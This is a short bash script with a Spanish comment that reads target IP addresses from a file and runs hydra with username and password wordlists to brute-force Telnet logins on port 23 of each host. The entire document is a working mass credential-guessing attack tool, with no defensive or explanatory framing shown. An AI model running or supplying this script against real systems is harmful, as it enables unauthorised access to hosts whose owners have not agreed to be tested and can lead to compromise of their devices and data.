#!/bin/bash
# Fuerza bruta Telnet, de listado de IPs desde fichero ip.txt

for i in `cat ip.txt`
do
        echo $i
        hydra -L usuarios.txt -P claves.txt telnet://$i:23
done
